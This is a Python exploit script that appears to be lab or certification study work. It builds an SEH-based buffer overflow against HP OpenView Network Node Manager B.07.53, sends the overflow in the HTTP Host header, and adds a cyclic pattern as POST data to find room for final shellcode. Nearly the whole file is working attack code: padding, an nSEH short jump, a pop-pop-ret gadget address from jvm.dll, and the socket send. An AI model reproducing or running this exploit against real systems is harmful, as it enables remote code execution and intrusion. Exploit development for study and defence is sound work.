#!/usr/bin/env python3

# author: greyshell
# description: finding the right place for final shellcode, as POST parameter

import socket

# global constant variable
HOST = "172.16.116.198"
PORT = "7510"


def main():
    # max crash buff length = 3780
    total_len_buff = 3780

    initial_buff = "A" * 3305

    # 1035FE34   48               DEC EAX
    # 1035FE35   48               DEC EAX
    # 1035FE36   77 04            JA SHORT 1035FE59
    # little endian format: "\x4c\x4c\x77\x04"  ==> bad char friendly
    nseh = "\x48\x48\x77\x04"

    # 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR:
    # False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP
    # OpenView\jre\jreActive\bin\client\jvm.dll)
    seh = (0x6d6e394a.to_bytes(4, 'little')).decode('ISO-8859-1')

    buff_last = "D" * (total_len_buff - len(initial_buff) - len(nseh) - len(seh))

    crash = initial_buff + nseh + seh + buff_last

    # generate msf pattern of 1500 bytes: !mona pattern_create 1500
    test_buff = (
        "\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38"
        "\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37"
        "\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36"
        "\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41\x64\x33\x41\x64\x34\x41\x64\x35"
        "\x41\x64\x36\x41\x64\x37\x41\x64\x38\x41\x64\x39\x41\x65\x30\x41\x65\x31\x41\x65\x32\x41\x65\x33\x41\x65\x34"
        "\x41\x65\x35\x41\x65\x36\x41\x65\x37\x41\x65\x38\x41\x65\x39\x41\x66\x30\x41\x66\x31\x41\x66\x32\x41\x66\x33"
        "\x41\x66\x34\x41\x66\x35\x41\x66\x36\x41\x66\x37\x41\x66\x38\x41\x66\x39\x41\x67\x30\x41\x67\x31\x41\x67\x32"
        "\x41\x67\x33\x41\x67\x34\x41\x67\x35\x41\x67\x36\x41\x67\x37\x41\x67\x38\x41\x67\x39\x41\x68\x30\x41\x68\x31"
        "\x41\x68\x32\x41\x68\x33\x41\x68\x34\x41\x68\x35\x41\x68\x36\x41\x68\x37\x41\x68\x38\x41\x68\x39\x41\x69\x30"
        "\x41\x69\x31\x41\x69\x32\x41\x69\x33\x41\x69\x34\x41\x69\x35\x41\x69\x36\x41\x69\x37\x41\x69\x38\x41\x69\x39"
        "\x41\x6a\x30\x41\x6a\x31\x41\x6a\x32\x41\x6a\x33\x41\x6a\x34\x41\x6a\x35\x41\x6a\x36\x41\x6a\x37\x41\x6a\x38"
        "\x41\x6a\x39\x41\x6b\x30\x41\x6b\x31\x41\x6b\x32\x41\x6b\x33\x41\x6b\x34\x41\x6b\x35\x41\x6b\x36\x41\x6b\x37"
        "\x41\x6b\x38\x41\x6b\x39\x41\x6c\x30\x41\x6c\x31\x41\x6c\x32\x41\x6c\x33\x41\x6c\x34\x41\x6c\x35\x41\x6c\x36"
        "\x41\x6c\x37\x41\x6c\x38\x41\x6c\x39\x41\x6d\x30\x41\x6d\x31\x41\x6d\x32\x41\x6d\x33\x41\x6d\x34\x41\x6d\x35"
        "\x41\x6d\x36\x41\x6d\x37\x41\x6d\x38\x41\x6d\x39\x41\x6e\x30\x41\x6e\x31\x41\x6e\x32\x41\x6e\x33\x41\x6e\x34"
        "\x41\x6e\x35\x41\x6e\x36\x41\x6e\x37\x41\x6e\x38\x41\x6e\x39\x41\x6f\x30\x41\x6f\x31\x41\x6f\x32\x41\x6f\x33"
        "\x41\x6f\x34\x41\x6f\x35\x41\x6f\x36\x41\x6f\x37\x41\x6f\x38\x41\x6f\x39\x41\x70\x30\x41\x70\x31\x41\x70\x32"
        "\x41\x70\x33\x41\x70\x34\x41\x70\x35\x41\x70\x36\x41\x70\x37\x41\x70\x38\x41\x70\x39\x41\x71\x30\x41\x71\x31"
        "\x41\x71\x32\x41\x71\x33\x41\x71\x34\x41\x71\x35\x41\x71\x36\x41\x71\x37\x41\x71\x38\x41\x71\x39\x41\x72\x30"
        "\x41\x72\x31\x41\x72\x32\x41\x72\x33\x41\x72\x34\x41\x72\x35\x41\x72\x36\x41\x72\x37\x41\x72\x38\x41\x72\x39"
        "\x41\x73\x30\x41\x73\x31\x41\x73\x32\x41\x73\x33\x41\x73\x34\x41\x73\x35\x41\x73\x36\x41\x73\x37\x41\x73\x38"
        "\x41\x73\x39\x41\x74\x30\x41\x74\x31\x41\x74\x32\x41\x74\x33\x41\x74\x34\x41\x74\x35\x41\x74\x36\x41\x74\x37"
        "\x41\x74\x38\x41\x74\x39\x41\x75\x30\x41\x75\x31\x41\x75\x32\x41\x75\x33\x41\x75\x34\x41\x75\x35\x41\x75\x36"
        "\x41\x75\x37\x41\x75\x38\x41\x75\x39\x41\x76\x30\x41\x76\x31\x41\x76\x32\x41\x76\x33\x41\x76\x34\x41\x76\x35"
        "\x41\x76\x36\x41\x76\x37\x41\x76\x38\x41\x76\x39\x41\x77\x30\x41\x77\x31\x41\x77\x32\x41\x77\x33\x41\x77\x34"
        "\x41\x77\x35\x41\x77\x36\x41\x77\x37\x41\x77\x38\x41\x77\x39\x41\x78\x30\x41\x78\x31\x41\x78\x32\x41\x78\x33"
        "\x41\x78\x34\x41\x78\x35\x41\x78\x36\x41\x78\x37\x41\x78\x38\x41\x78\x39\x41\x79\x30\x41\x79\x31\x41\x79\x32"
        "\x41\x79\x33\x41\x79\x34\x41\x79\x35\x41\x79\x36\x41\x79\x37\x41\x79\x38\x41\x79\x39\x41\x7a\x30\x41\x7a\x31"
        "\x41\x7a\x32\x41\x7a\x33\x41\x7a\x34\x41\x7a\x35\x41\x7a\x36\x41\x7a\x37\x41\x7a\x38\x41\x7a\x39\x42\x61\x30"
        "\x42\x61\x31\x42\x61\x32\x42\x61\x33\x42\x61\x34\x42\x61\x35\x42\x61\x36\x42\x61\x37\x42\x61\x38\x42\x61\x39"
        "\x42\x62\x30\x42\x62\x31\x42\x62\x32\x42\x62\x33\x42\x62\x34\x42\x62\x35\x42\x62\x36\x42\x62\x37\x42\x62\x38"
        "\x42\x62\x39\x42\x63\x30\x42\x63\x31\x42\x63\x32\x42\x63\x33\x42\x63\x34\x42\x63\x35\x42\x63\x36\x42\x63\x37"
        "\x42\x63\x38\x42\x63\x39\x42\x64\x30\x42\x64\x31\x42\x64\x32\x42\x64\x33\x42\x64\x34\x42\x64\x35\x42\x64\x36"
        "\x42\x64\x37\x42\x64\x38\x42\x64\x39\x42\x65\x30\x42\x65\x31\x42\x65\x32\x42\x65\x33\x42\x65\x34\x42\x65\x35"
        "\x42\x65\x36\x42\x65\x37\x42\x65\x38\x42\x65\x39\x42\x66\x30\x42\x66\x31\x42\x66\x32\x42\x66\x33\x42\x66\x34"
        "\x42\x66\x35\x42\x66\x36\x42\x66\x37\x42\x66\x38\x42\x66\x39\x42\x67\x30\x42\x67\x31\x42\x67\x32\x42\x67\x33"
        "\x42\x67\x34\x42\x67\x35\x42\x67\x36\x42\x67\x37\x42\x67\x38\x42\x67\x39\x42\x68\x30\x42\x68\x31\x42\x68\x32"
        "\x42\x68\x33\x42\x68\x34\x42\x68\x35\x42\x68\x36\x42\x68\x37\x42\x68\x38\x42\x68\x39\x42\x69\x30\x42\x69\x31"
        "\x42\x69\x32\x42\x69\x33\x42\x69\x34\x42\x69\x35\x42\x69\x36\x42\x69\x37\x42\x69\x38\x42\x69\x39\x42\x6a\x30"
        "\x42\x6a\x31\x42\x6a\x32\x42\x6a\x33\x42\x6a\x34\x42\x6a\x35\x42\x6a\x36\x42\x6a\x37\x42\x6a\x38\x42\x6a\x39"
        "\x42\x6b\x30\x42\x6b\x31\x42\x6b\x32\x42\x6b\x33\x42\x6b\x34\x42\x6b\x35\x42\x6b\x36\x42\x6b\x37\x42\x6b\x38"
        "\x42\x6b\x39\x42\x6c\x30\x42\x6c\x31\x42\x6c\x32\x42\x6c\x33\x42\x6c\x34\x42\x6c\x35\x42\x6c\x36\x42\x6c\x37"
        "\x42\x6c\x38\x42\x6c\x39\x42\x6d\x30\x42\x6d\x31\x42\x6d\x32\x42\x6d\x33\x42\x6d\x34\x42\x6d\x35\x42\x6d\x36"
        "\x42\x6d\x37\x42\x6d\x38\x42\x6d\x39\x42\x6e\x30\x42\x6e\x31\x42\x6e\x32\x42\x6e\x33\x42\x6e\x34\x42\x6e\x35"
        "\x42\x6e\x36\x42\x6e\x37\x42\x6e\x38\x42\x6e\x39\x42\x6f\x30\x42\x6f\x31\x42\x6f\x32\x42\x6f\x33\x42\x6f\x34"
        "\x42\x6f\x35\x42\x6f\x36\x42\x6f\x37\x42\x6f\x38\x42\x6f\x39\x42\x70\x30\x42\x70\x31\x42\x70\x32\x42\x70\x33"
        "\x42\x70\x34\x42\x70\x35\x42\x70\x36\x42\x70\x37\x42\x70\x38\x42\x70\x39\x42\x71\x30\x42\x71\x31\x42\x71\x32"
        "\x42\x71\x33\x42\x71\x34\x42\x71\x35\x42\x71\x36\x42\x71\x37\x42\x71\x38\x42\x71\x39\x42\x72\x30\x42\x72\x31"
        "\x42\x72\x32\x42\x72\x33\x42\x72\x34\x42\x72\x35\x42\x72\x36\x42\x72\x37\x42\x72\x38\x42\x72\x39\x42\x73\x30"
        "\x42\x73\x31\x42\x73\x32\x42\x73\x33\x42\x73\x34\x42\x73\x35\x42\x73\x36\x42\x73\x37\x42\x73\x38\x42\x73\x39"
        "\x42\x74\x30\x42\x74\x31\x42\x74\x32\x42\x74\x33\x42\x74\x34\x42\x74\x35\x42\x74\x36\x42\x74\x37\x42\x74\x38"
        "\x42\x74\x39\x42\x75\x30\x42\x75\x31\x42\x75\x32\x42\x75\x33\x42\x75\x34\x42\x75\x35\x42\x75\x36\x42\x75\x37"
        "\x42\x75\x38\x42\x75\x39\x42\x76\x30\x42\x76\x31\x42\x76\x32\x42\x76\x33\x42\x76\x34\x42\x76\x35\x42\x76\x36"
        "\x42\x76\x37\x42\x76\x38\x42\x76\x39\x42\x77\x30\x42\x77\x31\x42\x77\x32\x42\x77\x33\x42\x77\x34\x42\x77\x35"
        "\x42\x77\x36\x42\x77\x37\x42\x77\x38\x42\x77\x39\x42\x78\x30\x42\x78\x31\x42\x78\x32\x42\x78\x33\x42\x78\x34"
        "\x42\x78\x35\x42\x78\x36\x42\x78\x37\x42\x78\x38\x42\x78\x39")

    # preparing the GET request
    buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
    buffer += "Host: " + crash + "\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    buffer += "Content-Length: 1048580\r\n\r\n"

    # place the test_buff as POST data but keeping the method GET
    buffer += test_buff

    print(f"[+] sending evil GET HTTP request to HP NNM -B.07.53, hosted on {HOST}:{PORT}")
    print(f"[+] buffer length: {len(crash)}")
    exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    exploit.connect((HOST, int(PORT)))
    exploit.send(buffer.encode())
    exploit.close()


if __name__ == "__main__":
    main()
